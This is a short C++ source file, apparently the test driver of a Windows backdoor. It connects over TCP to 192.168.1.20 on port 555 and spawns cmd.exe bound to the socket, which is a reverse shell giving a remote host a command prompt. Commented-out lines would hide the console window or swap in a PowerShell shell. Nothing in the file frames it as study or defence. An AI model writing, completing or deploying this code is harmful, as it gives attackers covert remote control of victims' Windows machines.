//compile : g++ socket_winbd.cpp test_winbd.cpp -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
#include "socket_winbd.h"
//#include "comd_socket.h" rajouter comd_socket.cpp


int main()
{
	//FreeConsole();
	SOCKET socks;
	WSADATA wsa;

	struct sockaddr_in session;
	//struct hostent* remote_host;
	//struct servent* get_service_name;
	//struct servent* get_service_port;

	WSAStartup(MAKEWORD(2, 2), &wsa);
	socks = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

	session.sin_family = AF_INET;
	session.sin_addr.s_addr = inet_addr("192.168.1.20");
	session.sin_port = htons(555);

	//const char remote_addr[] = "192.168.1.20";
	//char* gt = ghostbyaddr_ipv4(remote_host, remote_addr);
	//get_service_name = gservbyport(get_service_name, 22);
	//get_service_port = gservbyname(get_service_port,"ssh");

	//printf("Hostname : %s\n", gt);
	//printf("Service By Port : %s\n",get_service_name->s_name);
	//printf("Service Protocol : %s\n", get_service_name->s_proto);
	//printf("%u\n", ntohs(get_service_port->s_port));

	int c = connect(socks, session);
	if (c != -1)
	{
		execute_process(socks,"cmd.exe");
		//execute_powershell(socks);
	}
	return 0;
}